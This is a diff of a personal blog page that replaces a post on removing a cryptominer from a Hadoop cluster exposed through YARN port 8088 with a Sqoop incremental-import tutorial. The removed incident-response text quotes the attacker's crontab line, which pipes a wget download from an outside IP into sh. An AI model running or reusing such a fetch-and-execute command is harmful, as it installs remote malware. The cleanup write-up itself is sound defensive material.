@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="学习历程,hadoop 安全,挖矿," />
+  <meta name="keywords" content="学习历程,sqoop,数据增量同步," />
 
 
 
@@ -79,18 +79,20 @@
 
 
 
-<meta name="description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
-<meta name="keywords" content="学习历程,hadoop 安全,挖矿">
+<meta name="description" content="Sqoop 实现数据库数据增量导入更新HDFS     首先我们来讨论一下增量同步需要注意的那些问题: 1.数据既然是增量同步当然是只同步变化的数据 不是全量拉取覆盖操作 时间以及资源浪费问题 2.有新数据insert 需要同步 当然update 更新的数据也需要同步 需要注意的是更新的数据同步问题 3.并发控制问题 目前大部分的mysql数据同步都是通过监听bin/log 实现 现在我们使用sq">
+<meta name="keywords" content="学习历程,sqoop,数据增量同步">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hadoop 挖矿 问题解决">
-<meta property="og:url" content="https://mrdlontheway.github.io/2018/08/01/2018-08-02-hadoop 挖矿 问题解决/index.html">
+<meta property="og:title" content="Sqoop 实现数据库数据增量导入更新HDFS">
+<meta property="og:url" content="https://mrdlontheway.github.io/2018/08/06/2018-08-06-Sqoop 实现数据库数据增量导入更新HDFS/index.html">
 <meta property="og:site_name" content="DaiLe&#39;s blog">
-<meta property="og:description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
+<meta property="og:description" content="Sqoop 实现数据库数据增量导入更新HDFS     首先我们来讨论一下增量同步需要注意的那些问题: 1.数据既然是增量同步当然是只同步变化的数据 不是全量拉取覆盖操作 时间以及资源浪费问题 2.有新数据insert 需要同步 当然update 更新的数据也需要同步 需要注意的是更新的数据同步问题 3.并发控制问题 目前大部分的mysql数据同步都是通过监听bin/log 实现 现在我们使用sq">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-09-19T07:52:10.283Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/sqoop1.png">
+<meta property="og:updated_time" content="2018-09-29T07:11:29.352Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hadoop 挖矿 问题解决">
-<meta name="twitter:description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
+<meta name="twitter:title" content="Sqoop 实现数据库数据增量导入更新HDFS">
+<meta name="twitter:description" content="Sqoop 实现数据库数据增量导入更新HDFS     首先我们来讨论一下增量同步需要注意的那些问题: 1.数据既然是增量同步当然是只同步变化的数据 不是全量拉取覆盖操作 时间以及资源浪费问题 2.有新数据insert 需要同步 当然update 更新的数据也需要同步 需要注意的是更新的数据同步问题 3.并发控制问题 目前大部分的mysql数据同步都是通过监听bin/log 实现 现在我们使用sq">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/sqoop1.png">
 
 
 
@@ -120,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://mrdlontheway.github.io/2018/08/01/2018-08-02-hadoop 挖矿 问题解决/"/>
+  <link rel="canonical" href="https://mrdlontheway.github.io/2018/08/06/2018-08-06-Sqoop 实现数据库数据增量导入更新HDFS/"/>
 
 
 
 
 
-  <title>hadoop 挖矿 问题解决 | DaiLe's blog</title>
+  <title>Sqoop 实现数据库数据增量导入更新HDFS | DaiLe's blog</title>
   
 
 
@@ -263,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mrdlontheway.github.io/2018/08/01/2018-08-02-hadoop 挖矿 问题解决/">
+    <link itemprop="mainEntityOfPage" href="https://mrdlontheway.github.io/2018/08/06/2018-08-06-Sqoop 实现数据库数据增量导入更新HDFS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="DaiLe">
@@ -280,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hadoop 挖矿 问题解决</h1>
+          <h1 class="post-title" itemprop="name headline">Sqoop 实现数据库数据增量导入更新HDFS</h1>
         
 
         <div class="post-meta">
@@ -292,8 +294,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-01T15:00:08+08:00">
-                2018-08-01
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-06T15:00:08+08:00">
+                2018-08-06
               </time>
             
 
@@ -352,20 +354,44 @@
       
 
       
-        <h1>hadoop 挖矿 问题解决</h1>
+        <h1>Sqoop 实现数据库数据增量导入更新HDFS</h1>
 
-<p>之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿</p>
-<p>直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客</p>
-<p><a href="https://blog.csdn.net/love_lixr/article/details/81454548" target="_blank" rel="noopener">https://blog.csdn.net/love_lixr/article/details/81454548</a> </p>
-<p>1.首先yarn的 cpu会直接飙满  然后一直提交小任务 一般的挖矿程序无非是 定时器远程 下载挖矿程序 定时器执行 </p>
-<p>2.第一步 查询yarn 的相关程序信息 <code>ps -ef | grep yarn</code></p>
-<p> yarn 46185 1 99 May03 ?  4 - 19 : 04 : 28 / tmp / java - c / tmp / w.conf</p>
-<p>这就是那个该死的主程序了 这时候不要着急kill 找到根源 </p>
-<p>3.第二步查看 yarn 用户的相关定时任务 <code>crontab -l -u yarn</code></p>
-<p><strong>*</strong> wget -q -O - <a href="http://185.222.210.59/cr.sh" target="_blank" rel="noopener">http://185.222.210.59/cr.sh</a> | sh &gt; /dev/null 2&gt;&amp;1</p>
-<p>这玩意就是定时器了 </p>
-<p>4.<code>crontab -r -u yarn</code>  删除yarn用户下所有的定时任务  然后 kill -9 PID 挖矿程序 删除 rm -rf /var/tmp/java  相关文件</p>
-<p>5.这个时候 挖矿的问题是解决了 但是根本问题没有解决 那就是 8088端口开放问题  可以通过防火墙 或者绑定内网ip 来限制访问</p>
+<p>   首先我们来讨论一下增量同步需要注意的那些问题:</p>
+<p>1.数据既然是增量同步当然是只同步变化的数据 不是全量拉取覆盖操作 时间以及资源浪费问题</p>
+<p>2.有新数据insert 需要同步 当然update 更新的数据也需要同步 需要注意的是更新的数据同步问题</p>
+<p>3.并发控制问题</p>
+<h2>目前大部分的mysql数据同步都是通过监听bin/log 实现 现在我们使用sqoop 来实现mysql增量同步hdfs</h2>
+
+
+<h3>1.安装sqoop</h3><br> 这里比较简单 就不多说了  我使用的是CDH 直接添加服务即可 下一步下一步就完成，如果是手动安装需要到sqoop官网下载对应tar包解压配置这里就不<br><br> 多说了  自行百度<br><br><h3>2.sqoop的配置解释</h3>
+
+<p> 先直接贴出命令example </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sqoop import \</span><br><span class="line"></span><br><span class="line">--connect jdbc:mysql://***:3306/disaster \</span><br><span class="line"></span><br><span class="line">--username ** \</span><br><span class="line"></span><br><span class="line">--password ** \</span><br><span class="line"></span><br><span class="line">--table sqoop_test \</span><br><span class="line"></span><br><span class="line">--check-column add_time \</span><br><span class="line"></span><br><span class="line">--incremental lastmodified \</span><br><span class="line"></span><br><span class="line">--last-value &quot;2018-08-06 12:07:15&quot; \</span><br><span class="line"></span><br><span class="line">--merge-key id \</span><br><span class="line"></span><br><span class="line">-m 1 \</span><br><span class="line"></span><br><span class="line">--target-dir /user/sqoop-test \</span><br></pre></td></tr></table></figure>
+<p>1、Append方式</p>
+<p>参数    说明</p>
+<p>–incremental append    基于递增列的增量导入（将递增列值大于阈值的所有数据增量导入Hadoop）</p>
+<p>–check-column    递增列（int）</p>
+<p>–last-value    阈值（int）</p>
+<p>append模式增量导入  大概使用方法 check-column 对指定的列进行判断  大于则增量导入 例如 -check-column ID  –last-value 5<br>则ID大于5的ID会被全部导入  但是有一个问题  ID 为4的数据被更新的怎么办? 无法实现更新数据的同步 </p>
+<p>2、lastModify方式<br>此方式要求原有表中有time字段，它能指定一个时间戳，让Sqoop把该时间戳之后的数据导入至 hdfs(这里为什么没有写hive  后续就知道了)<br>正因为之前数据会出现更新的问题所有有了这个时间戳time 字段也就是我命令里面的add_time 正规一点将应该讲update_time 这里比较懒就不该了<br>当数据更新的时候更新对应的add_time 字段 这样就可以检测到该数据为需要更新同步的数据  这里数据可以被检测到了  但是如何实现 同步更新而不是 增量去插入呢</p>
+<p>–incremental lastmodified<br>  基于时间列的增量导入（将时间列大于等于阈值的所有数据增量导入Hadoop）</p>
+<p>  –check-column<br>  时间列（int）</p>
+<p>  –last-value<br>  阈值（int）</p>
+<p>  –merge-key<br>  合并列（主键，合并键值相同的记录）</p>
+<p>这种方式可以选取merge-key 该参数是设置需要update的字段 可以理解为主键 若该字段在已有数据存在则更新 没有则插入</p>
+<p>到这里问题又来了  我第一次设置last-value 时间阈值 那后续时间一直推进以往的数据都已经同步过了 我还要动态去更改last-value 吗?<br>这里 网上的各种资料表明 时间会自动更新  经过验证 的确会自动更新last-value 时间阈值 前提是使用job的方式！</p>
+<p>如何创建job 命令自行百度  这里需要提醒的是 启动job输入的是数据库密码 不是linux账户密码。。。</p>
+<p>到这里解释一下为什么同步的只能是hdfs 不能是hive  因为sqoop目前不支持hive 以后会不会更新还不知道</p>
+<p><img src="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/sqoop1.png" alt="成果1"></p>
+<p></p><h3>3.并发控制</h3><br>我们知道通过 -m 参数能够设置导入数据的 map 任务数量，即指定了 -m 即表示导入方式为并发导入，这时我们必须同时指定 –split-by 参数指定根据哪一列来实现哈希分片，从而将不同分片的数据分发到不同 map 任务上去跑，避免数据倾斜。<p></p>
+<p>ps:</p>
+<ul>
+<li>生产环境中，为了防止主库被Sqoop抽崩，我们一般从备库中抽取数据。</li>
+<li>一般RDBMS的导出速度控制在60~80MB/s，每个 map 任务的处理速度5~10MB/s 估算，即 -m 参数一般设置4~8，表示启动 4~8 个map 任务并发抽取。</li>
+</ul>
+<p>这里提一下 踩得坑  因为CDH用的 cloudrea jdk 1.7  而我系统的环境变量为jdk 1.8  会报错 字节码文件不兼容 所以一定要保证执行sqoop job的机器jdk与 cdh jdk一致</p>
+<p>目前hive的同步 还没有尝试 但是可以间接同步就是直接sqoop 同步更新到hive 的hdfs元数据目录这样搭到目的 还未尝试</p>
+<p>另外一种方式 hive2.2 增加了merge into 的操作 可以需要更新的数据存入hive临时表 然后把 临时表和主表merge into 合并操作 hive 表必须是“事务表”（即：支持事务)</p>
 
       
     </div>
@@ -385,9 +411,9 @@
           
             <a href="/tags/学习历程/" rel="tag"># 学习历程</a>
           
-            <a href="/tags/hadoop-安全/" rel="tag"># hadoop 安全</a>
+            <a href="/tags/sqoop/" rel="tag"># sqoop</a>
           
-            <a href="/tags/挖矿/" rel="tag"># 挖矿</a>
+            <a href="/tags/数据增量同步/" rel="tag"># 数据增量同步</a>
           
         </div>
       
@@ -400,8 +426,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/01/2018-08-01-JAVA 高并发锁/" rel="next" title="JAVA 高并发锁">
-                <i class="fa fa-chevron-left"></i> JAVA 高并发锁
+              <a href="/2018/08/04/2018-08-04-JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比/" rel="next" title="JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比">
+                <i class="fa fa-chevron-left"></i> JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比
               </a>
             
           </div>
@@ -409,10 +435,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/01/2018-08-01-分布式锁/" rel="prev" title="分布式锁">
-                分布式锁 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -489,7 +511,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -511,7 +533,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -608,7 +630,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">hadoop 挖矿 问题解决</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">Sqoop 实现数据库数据增量导入更新HDFS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">目前大部分的mysql数据同步都是通过监听bin/log 实现 现在我们使用sqoop 来实现mysql增量同步hdfs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.安装sqoop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.sqoop的配置解释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.并发控制</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
